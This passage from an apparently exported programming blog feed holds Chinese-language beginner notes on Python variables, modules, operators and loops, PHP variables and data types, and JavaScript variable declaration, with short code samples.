keyword">function</span> main3 <span class="token keyword">:</span> <span class="token keyword">function</span> trivial2 <span class="token keyword">:</span> <span class="token keyword">function</span> main  </code></pre></li></ul><h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><pre class=" language-bash"><code class="language-bash">def main<span class="token punctuation">(</span><span class="token punctuation">)</span>:    x<span class="token operator">=</span>5    trivial<span class="token punctuation">(</span><span class="token punctuation">)</span>def trivial<span class="token punctuation">(</span><span class="token punctuation">)</span>:    print<span class="token punctuation">(</span>x<span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 结果会产生一个NameError的回溯错误，因为主函数创建的x无法被trivial()识别</span></code></pre><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><ul><li>定义：一个变量可以被程序中任何部分识别，这样的变量叫做全局变量</li><li>创建方式：将创建它的赋值语句放在程序顶部</li><li>任何函数都能读取全局变量的值，然而它的值不能在函数内部进行修改，除非修改语句之前有以下的语句形式<pre class=" language-bash"><code class="language-bash">global 全局变量名</code></pre></li></ul><blockquote><p>注：global仅影响所在函数体内其后的语句，它不允许在其他函数内部修改全局变量的值。</p></blockquote><pre class=" language-bash"><code class="language-bash">x<span class="token operator">=</span>0  <span class="token comment" spellcheck="true">#定义一个全局变量</span>def main<span class="token punctuation">(</span><span class="token punctuation">)</span>:    print<span class="token punctuation">(</span>str<span class="token punctuation">(</span>x<span class="token punctuation">))</span>    trivial<span class="token punctuation">(</span><span class="token punctuation">)</span>    print<span class="token punctuation">(</span>str<span class="token punctuation">(</span>x<span class="token punctuation">))</span>def trivial<span class="token punctuation">(</span><span class="token punctuation">)</span>:    global x    x +<span class="token operator">=</span> 7    print<span class="token punctuation">(</span>str<span class="token punctuation">(</span>x<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#输出结果</span>077</code></pre><h4 id="命名常量"><a href="#命名常量" class="headerlink" title="命名常量"></a>命名常量</h4><p>命名常量的名字使用大写字母的单词，并且单词间使用下划线分隔，并赋给一个常量。</p><pre class=" language-bash"><code class="language-bash">INTEREST_TATE <span class="token operator">=</span> 0.04BOOK_TITLE <span class="token operator">=</span> <span class="token string">"python"</span></code></pre><blockquote><p>注：python中允许给任何变量重新赋值，程序员要负责地不改变这个变量的值</p></blockquote><h3 id="库模块"><a href="#库模块" class="headerlink" title="库模块"></a>库模块</h3><ul><li>python通过称为库模块的文件支持函数的重用</li><li>库模块是一个扩展名为.py的文件，包含了可以被其他任何程序使用(我们可以称为imported)的函数和变量</li><li>库模块可以使用IDLE和任何文本编辑器进行创建<pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#不使用库模块</span>def add<span class="token punctuation">(</span>x,y<span class="token punctuation">)</span>:  flag <span class="token operator">=</span> x+y  <span class="token keyword">return</span> flagamount <span class="token operator">=</span> add<span class="token punctuation">(</span>7,8<span class="token punctuation">)</span>print<span class="token punctuation">(</span>str<span class="token punctuation">(</span>amount<span class="token punctuation">))</span></code></pre><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#使用库模块</span><span class="token comment" spellcheck="true">#方式一</span><span class="token function">import</span> <span class="token function">sum</span>  <span class="token comment" spellcheck="true">#sum.py文件为add函数的声明与定义</span>amount <span class="token operator">=</span> sum.add<span class="token punctuation">(</span>7,8<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#使用sum.add()代替上述add()</span>print<span class="token punctuation">(</span>str<span class="token punctuation">(</span>amount<span class="token punctuation">))</span></code></pre><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#使用库模块</span><span class="token comment" spellcheck="true">#方法二</span>from <span class="token function">sum</span> <span class="token function">import</span> *  //表示调用sum.py文件的所有函数amount <span class="token operator">=</span> add<span class="token punctuation">(</span>7,8<span class="token punctuation">)</span>print<span class="token punctuation">(</span>str<span class="token punctuation">(</span>amount<span class="token punctuation">))</span></code></pre></li></ul><h4 id="python标准库模块"><a href="#python标准库模块" class="headerlink" title="python标准库模块"></a>python标准库模块</h4><ul><li><font color="#fb8c00">os</font> 删除和重命名文件</li><li><font color="#fb8c00">os.path</font> 确定指定的文件是否存在，是os的子模块</li><li><font color="#fb8c00">pickle</font> 在文件中存储对象(如字典、列表和集合)，并能从文件中取回对象</li><li><font color="#fb8c00">random</font> 随机选择数字和子集</li><li><font color="#fb8c00">tkinter</font> 支持程序拥有一个图形用户界面</li><li><font color="#fb8c00">turtle</font> 支持图形化turtle</li><li><font color="#fb8c00">math</font> 包含了三角函数、指数函数和对数函数</li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="调用其他函数的函数"><a href="#调用其他函数的函数" class="headerlink" title="调用其他函数的函数"></a>调用其他函数的函数</h3><p>一个函数可以调用另一个函数，当被调用的函数结束时(return语句之后或被调用函数的最后一个语句执行完毕之后)，控制流程返回到调用函数中调用发生之后的位置</p><pre class=" language-bash"><code class="language-bash">def main<span class="token punctuation">(</span><span class="token punctuation">)</span>:    firstPart<span class="token punctuation">(</span><span class="token punctuation">)</span>    print<span class="token punctuation">(</span>str<span class="token punctuation">(</span>4<span class="token punctuation">)</span>+<span class="token string">": from function main"</span><span class="token punctuation">)</span>def firstPart<span class="token punctuation">(</span><span class="token punctuation">)</span>:    print<span class="token punctuation">(</span>str<span class="token punctuation">(</span>1<span class="token punctuation">)</span>+<span class="token string">": from function firstPart"</span><span class="token punctuation">)</span>    secondPart<span class="token punctuation">(</span><span class="token punctuation">)</span>    print<span class="token punctuation">(</span>str<span class="token punctuation">(</span>3<span class="token punctuation">)</span>+<span class="token string">": from function firstPart"</span><span class="token punctuation">)</span>def secondPart<span class="token punctuation">(</span><span class="token punctuation">)</span>:    print<span class="token punctuation">(</span>str<span class="token punctuation">(</span>2<span class="token punctuation">)</span>+<span class="token string">": from function secondPart"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#输出结果</span>1: from <span class="token keyword">function</span> firstPart2: from <span class="token keyword">function</span> secondPart3: from <span class="token keyword">function</span> firstPart4: from <span class="token keyword">function</span> main</code></pre><h3 id="列表解析"><a href="#列表解析" class="headerlink" title="列表解析"></a>列表解析</h3><p>当我们想要对列表中的每个元素执行一个特定函数时，一个for循环可以完成。但是，更加简单的方法是使用列表解析。</p><pre class=" language-bash"><code class="language-bash">list2 <span class="token operator">=</span> <span class="token punctuation">[</span>f<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> list1<span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#将list1的每个元素的f(item)放入列表list2中，f不是一个内建函数就是用户自定义函数</span></code></pre><pre class=" language-bash"><code class="language-bash">def g<span class="token punctuation">(</span>x<span class="token punctuation">)</span>:    <span class="token keyword">return</span> <span class="token punctuation">(</span>int<span class="token punctuation">(</span>x<span class="token punctuation">)</span>**2<span class="token punctuation">)</span>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'2'</span>,<span class="token string">'5'</span>,<span class="token string">'6'</span>,<span class="token string">'7'</span><span class="token punctuation">]</span>list2 <span class="token operator">=</span> <span class="token punctuation">[</span>g<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> list1<span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#list2=[4,25,36,49]</span></code></pre><h4 id="过滤列表"><a href="#过滤列表" class="headerlink" title="过滤列表"></a>过滤列表</h4><p>在列表解析时加入if语句对列表进行筛选</p><pre class=" language-bash"><code class="language-bash">list2 <span class="token operator">=</span> <span class="token punctuation">[</span>g<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> list1 <span class="token keyword">if</span> int<span class="token punctuation">(</span>x<span class="token punctuation">)</span>%2<span class="token operator">==</span>1<span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#list2=[25,49],只有奇数的平方才会出现在列表里</span></code></pre><blockquote><p>注：列表解析可以用在字符串、元组和range函数产生的算术表达式</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP(1)</title>
      <link href="/2019/09/29/php1/"/>
      <url>/2019/09/29/php1/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><ul><li>php是一种脚本语言</li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>php变量格式：<font color="#fb8c00">$变量名</font>  </p><pre class=" language-php"><code class="language-php"><span class="token variable">$a</span><span class="token punctuation">;</span></code></pre><blockquote><p>注：变量中不能包含空格</p></blockquote><p>分号(;)又称指令终止符，用来结束一条PHP语句。</p><h3 id="全局变量和超全局变量"><a href="#全局变量和超全局变量" class="headerlink" title="全局变量和超全局变量"></a>全局变量和超全局变量</h3><h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>$name变量在A.php和B.php中被定义成全局变量，并且两个脚本彼此连接(一个脚本调用另一个脚本，或者包含另一个脚本)，则$name被称为全局变量(global)</p><h4 id="超全局变量-superglobal"><a href="#超全局变量-superglobal" class="headerlink" title="超全局变量(superglobal)"></a>超全局变量(superglobal)</h4><p>超全局变量的值对所有的脚本可用，超全局变量减少了用户注入式攻击进入到脚本的可能性。</p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul><li>php是类型宽松语言，这意味着它将在数据赋给每个变量的时候才确定数据类型</li><li>php 8种数据类型<br><font color="#fb8c00">Boolean</font> True 1/False 空字符串<br><font color="#fb8c00">Integer</font> 整型<br><font color="#fb8c00">Double/Float</font> 浮点数<br><font color="#fb8c00">String</font>  字符串<br><font color="#fb8c00">Object</font>  类的一个实例<br><font color="#fb8c00">Array</font>  数组<br><font color="#fb8c00">Resource</font>  对第三方资源(数据库)的引用<br><font color="#fb8c00">NULL</font>  一个未初始化的变量</li></ul><blockquote><p>注：Resource类型经常由处理外部应用程序文件或文件的函数返回。</p></blockquote><h3 id="settype-改变类型"><a href="#settype-改变类型" class="headerlink" title="settype()改变类型"></a>settype()改变类型</h3><p><font color="#fb8c00">settype(变量名，新的类型)</font></p><pre class=" language-php"><code class="language-php"><span class="token variable">$undecided</span> <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span><span class="token function">settype</span><span class="token punctuation">(</span><span class="token variable">$undecided</span><span class="token punctuation">,</span><span class="token string">'string'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//将undecided(float)转为string类型</span></code></pre><blockquote><p>注：任何非0的数字转换为布尔值时都会变为true</p></blockquote><h3 id="通过类型转换改变类型"><a href="#通过类型转换改变类型" class="headerlink" title="通过类型转换改变类型"></a>通过类型转换改变类型</h3><p>此类转换与settype()相比，类型转换会产生一个拷贝，而保持原来的变量不变。<br><font color="#fb8c00">$newVar = (integer) $originalVar</font></p><pre class=" language-php"><code class="language-php"><span class="token variable">$undecided</span> <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span><span class="token variable">$holder</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$undecided</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//产生了一个新变量holder，undecided并没有改变</span></code></pre><blockquote><p>注：测试数据类型可用is_*(eg: is_bool)</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python(二)</title>
      <link href="/2019/09/29/python1/"/>
      <url>/2019/09/29/python1/</url>
      
        <content type="html"><![CDATA[<h2 id="关系和逻辑运算符"><a href="#关系和逻辑运算符" class="headerlink" title="关系和逻辑运算符"></a>关系和逻辑运算符</h2><h3 id="ASCII值"><a href="#ASCII值" class="headerlink" title="ASCII值"></a>ASCII值</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>在键盘的核心打字区域的47个按键中的每个按键可以产生两个字符，共计94个字符，加上由空格键产生的一个字符，共计95个字符，这些字符对应的数字在32-126之间，这些数值称为这些字符的ASCII值。</p><blockquote><p>注：ASCII标准给一些字符赋的值也会高于126</p></blockquote><h4 id="chr-ord"><a href="#chr-ord" class="headerlink" title="chr()/ord"></a>chr()/ord</h4><pre class=" language-python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">77</span><span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#打印输出ASCII值为77的单字符串</span></code></pre><pre class=" language-python"><code class="language-python">str <span class="token operator">=</span> <span class="token string">'a'</span><span class="token keyword">print</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#打印输出单字符串'a'的ASCII值</span></code></pre><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><ul><li>按字典序排序：数字优先于大写字母，大写字母优先于小写字母，两个字符串逐个字符(从左到右)进行比较来确定哪个字符串应该优先于另一个。</li><li>整型数可以与浮点数进行比较，其他不同类型的值不能进行比较，例如，字符串不能与数字进行比较。</li><li>关系运算符可以用于列表或元组中。要使两个列表或两个元组相同，它们必须有相同的长度，对应位置的元素也必须是相同的值。</li><li>条件的真值的判断通过依此比较对应元素值直到两个元素不同(或者不能比较)为止，或者直到其中一个序列没有元素为止<pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"three"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"two"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span></code></pre></li></ul><blockquote><p>注：条件”three”==3的值为假，但条件”three”&lt;3将会触发一个Traceback错误</p></blockquote><h4 id="in运算符"><a href="#in运算符" class="headerlink" title="in运算符"></a>in运算符</h4><p>当in这种运算符用于一个列表或元组时，意味着包含关系</p><pre class=" language-python"><code class="language-python"><span class="token string">'b'</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">.</span><span class="token string">'c'</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#b是该列表的子字符串</span><span class="token string">'B'</span> <span class="token operator">not</span> <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#B不是该元组的子字符串</span></code></pre><h4 id="列表元素的排序"><a href="#列表元素的排序" class="headerlink" title="列表元素的排序"></a>列表元素的排序</h4><p>列表中的元素可以用sort方法进行比较和排序</p><pre class=" language-python"><code class="language-python">list1<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>将list1改变为一个拥有相同元素的序列，但是其中的元素不管是数字还是字母都按照升序排列。</p><h5 id="sorted函数"><a href="#sorted函数" class="headerlink" title="sorted函数"></a>sorted函数</h5><p>sort方法改变了列表中所有元素的顺序，sorted函数则返回一个新的排好序的列表</p><pre class=" language-python"><code class="language-python">list2 <span class="token operator">=</span> sorted<span class="token punctuation">(</span>list1<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#list2会包含和list1一样的元素，但list2已经排好序</span></code></pre><blockquote><p>注：sort()方法不能用于赋值语句,sort没有返回值，所以list2 = list1.sort()只是在原地对数据进行重排。</p></blockquote><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p><font color="#fb8c00">and、not、or</font></p><ul><li>短路求值：当python遇到复合条件(cond1 and/not/or cond2)时，它会首先对cond1求值，如果cond1为假,python会认为整个复合条件为假，进而不会对cond2求值。</li><li>布尔数据类型:True/False</li><li>当数字作为条件时，0会被赋值为False,其他所有其他数字会被赋值为True</li></ul><h4 id="三种返回布尔值的方法"><a href="#三种返回布尔值的方法" class="headerlink" title="三种返回布尔值的方法"></a>三种返回布尔值的方法</h4><h5 id="startwith-endwith"><a href="#startwith-endwith" class="headerlink" title="startwith()/endwith()"></a>startwith()/endwith()</h5><pre class=" language-python"><code class="language-python"><span class="token string">"fantastic"</span><span class="token punctuation">.</span>startwith<span class="token punctuation">(</span><span class="token string">"fan"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#fantastic以fan开头，True</span><span class="token string">"fantastic"</span><span class="token punctuation">.</span>endwith<span class="token punctuation">(</span><span class="token string">"stic"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#fantastic以stic结尾，True</span><span class="token string">"fantastic"</span><span class="token punctuation">.</span>startwith<span class="token punctuation">(</span><span class="token string">"Fan"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#False</span><span class="token string">"elephant"</span><span class="token punctuation">.</span>endwith<span class="token punctuation">(</span><span class="token string">"fant"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#False</span></code></pre><h5 id="isinstance"><a href="#isinstance" class="headerlink" title="isinstance()"></a>isinstance()</h5><pre class=" language-python"><code class="language-python">isinstance<span class="token punctuation">(</span><span class="token string">"32"</span><span class="token punctuation">,</span>int<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#False "32"的数据类型是否为整形</span>isinstance<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span>int<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#True</span></code></pre><h5 id="判断数据类型的方法"><a href="#判断数据类型的方法" class="headerlink" title="判断数据类型的方法"></a>判断数据类型的方法</h5><p>假设str1是非空字符串</p><ul><li><font color="#fb8c00">str1.isdigit()</font> str1的所有字符都是数字</li><li><font color="#fb8c00">str1.isalpha()</font> str1的所有字符都是字母表上的数字</li><li><font color="#fb8c00">str1.isalnum()</font> str1的所有字符都是字母表上的字母或数字</li><li><font color="#fb8c00">str1.isspace()</font> str1仅含有空白字符 </li></ul><h2 id="判断结构-分支结构"><a href="#判断结构-分支结构" class="headerlink" title="判断结构(分支结构)"></a>判断结构(分支结构)</h2><h3 id="if-else语句"><a href="#if-else语句" class="headerlink" title="if-else语句"></a>if-else语句</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> condition1<span class="token punctuation">:</span>    语句块<span class="token number">1</span><span class="token keyword">else</span><span class="token punctuation">:</span>    语句块<span class="token number">2</span></code></pre><blockquote><p>注：语句块中的每行语句必须向右缩进相同的距离，缩进代表了一个块的结束和开始(使用4个空格缩进语句块)</p></blockquote><h3 id="嵌套语句"><a href="#嵌套语句" class="headerlink" title="嵌套语句"></a>嵌套语句</h3><p>if-else的缩进块中可以包含其他的if-else语句</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> condition1<span class="token punctuation">:</span>    <span class="token keyword">if</span> condition2<span class="token punctuation">:</span>        语句块<span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        语句块<span class="token number">2</span><span class="token keyword">else</span><span class="token punctuation">:</span>    语句块<span class="token number">3</span></code></pre><h3 id="elif子句"><a href="#elif子句" class="headerlink" title="elif子句"></a>elif子句</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> condition1<span class="token punctuation">:</span>    语句块<span class="token number">1</span><span class="token keyword">elif</span> condition2<span class="token punctuation">:</span>    语句块<span class="token number">2</span><span class="token keyword">elif</span> condition3<span class="token punctuation">:</span>    语句块<span class="token number">3</span><span class="token keyword">else</span><span class="token punctuation">:</span>    语句块<span class="token number">4</span></code></pre><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">while</span> condition<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#循环的头部,condition被称为循环的继续条件</span>    循环体</code></pre><ul><li>循环体的每次执行称为通过该循环的一轮(pass)</li><li>继续条件是个布尔表达式，等于True或False</li><li>while循环可以用来做输入验证</li></ul><h3 id="break-continue"><a href="#break-continue" class="headerlink" title="break/continue"></a>break/continue</h3><ul><li>当break语句执行时，循环会马上终止，跳出整个循环</li><li>当continue语句执行时，当前循环终止，进行下一轮循环<pre class=" language-python"><code class="language-python"><span class="token keyword">while</span> x<span class="token operator">></span><span class="token number">10</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> condition<span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span>      <span class="token keyword">break</span>  <span class="token comment" spellcheck="true">#执行print("hello,world")</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"world"</span><span class="token punctuation">)</span>      <span class="token keyword">continue</span>  <span class="token comment" spellcheck="true">#执行while x>10</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello,world"</span><span class="token punctuation">)</span></code></pre></li></ul><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> var <span class="token keyword">in</span> sequence<span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#sequence可以是等差数列、字符串、列表、元组或是一个文件对象</span>    语句块</code></pre><h3 id="等差数列的循环遍历"><a href="#等差数列的循环遍历" class="headerlink" title="等差数列的循环遍历"></a>等差数列的循环遍历</h3><h4 id="range-函数"><a href="#range-函数" class="headerlink" title="range()函数"></a>range()函数</h4><p><font color="#fb8c00">range()</font>函数可以用来产生一个等差数列，如果m/n是整数，并且m &lt; n，则函数range(m,n)会产生一系列整数m,m+1,m+2…..n-1</p><pre class=" language-bash"><code class="language-bash">range<span class="token punctuation">(</span>0,4<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0,1,2,3 可以被简写为range(4)</span>range<span class="token punctuation">(</span>-2,3<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#-2,-1,0,1,2</span></code></pre><blockquote><p>注：若想输出range函数的值，可以使用print(list(range(1,5)))</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>i<span class="token operator">*</span>i<span class="token punctuation">)</span>输出：<span class="token number">2</span> <span class="token number">4</span><span class="token number">3</span> <span class="token number">9</span><span class="token number">4</span> <span class="token number">16</span><span class="token number">5</span> <span class="token number">25</span></code></pre><h4 id="range-函数的步长值"><a href="#range-函数的步长值" class="headerlink" title="range()函数的步长值"></a>range()函数的步长值</h4><p><font color="#fb8c00">range(m,n,s)</font>会产生整数序列m,m+s,m+2s….m + r * s,其中r是最后一个满足m + r * s&lt; n的数。也就是说，这一序列开始于m,每一次都将m加上s，直到下一次将会产生一个数大于n，可选的n叫做range函数的步长值。 </p><pre class=" language-python"><code class="language-python">range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#3,5,7,9</span>range<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#-10,-6,-2,2,6</span>range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#6,5,4,3,2,1</span></code></pre><h3 id="for循环的嵌套"><a href="#for循环的嵌套" class="headerlink" title="for循环的嵌套"></a>for循环的嵌套</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> m <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token operator">*</span>n，<span class="token string">"\t"</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>  打印横行    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#打印竖列    </span>    <span class="token comment" spellcheck="true">#结果为一个5x5的表格</span></code></pre><h3 id="字符串的字符循环遍历"><a href="#字符串的字符循环遍历" class="headerlink" title="字符串的字符循环遍历"></a>字符串的字符循环遍历</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> ch <span class="token keyword">in</span> str1<span class="token punctuation">:</span>    语句块    <span class="token comment" spellcheck="true">#将会从第一个字符开始，针对字符串的每一个字符执行一遍循环体，因此这个循环会被执行len(str1)次</span></code></pre><h3 id="文本文件的行循环遍历"><a href="#文本文件的行循环遍历" class="headerlink" title="文本文件的行循环遍历"></a>文本文件的行循环遍历</h3><pre class=" language-python"><code class="language-python">infile <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"filename.txt"</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> infile<span class="token punctuation">:</span>    语句块infile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="pass语句"><a href="#pass语句" class="headerlink" title="pass语句"></a>pass语句</h3><p>如果只是希望循环遍历一个序列而并不做任何事情，这种时候可以使用pass语句</p><pre class=" language-python"><code class="language-python">infile <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"filename.txt"</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> infile<span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#打印文件的最后一行</span>infile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javascript(1)</title>
      <link href="/2019/09/09/javascript1/"/>
      <url>/2019/09/09/javascript1/</url>
      
        <content type="html"><![CDATA[<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>javascript是一种“松散类型的程序设计语言”(Loosely Typed Programming Language),程序变量不需要事先声明就可以直接使用,我们可以将Javascript变量视为一个在程序代码中暂存数据的容器，变量值可以在程序代码中随时使用变量名称读取或者更改变量值</p><h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><p>Javascript的变量需要使用var或者使用赋值语句来隐藏声明。</p><p>####　使用var声明</p><pre class=" language-bash"><code class="language-bash">var strName<span class="token punctuation">;</span>  //声明变量strName <span class="token operator">=</span> <span class="token string">"hello"</span>   //给变量赋值//也可以直接写成以下形式var strName <span class="token operator">=</span> <span class="token string">"hello"</span></code></pre><pre class=" language-bash"><code class="language-bash">var strName <span class="token operator">=</span> <span class="token string">"hello"</span>strName <span class="token operator">=</span> 1000 //对strName重新赋值</code></pre><blockquote><p>注：可以使用赋值语句随时更改其数据类型</p></blockquote><h4 id="隐藏声明"><a href="#隐藏声明" class="headerlink" title="隐藏声明"></a>隐藏声明</h4><pre class=" language-bash"><code class="language-bash">strNo <span class="token operator">=</span> 1234  //没有使用var但在赋值的同时创建了这个变量</code></pre><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>javascript有6种数据类型：<font color="#fb8c00">字符串：String 数值：Number 布尔：Boolean 特殊值：Undefined 特殊值：null 对象</font></p><h3 id="基本数据类型"><a href="#基本数据类型" 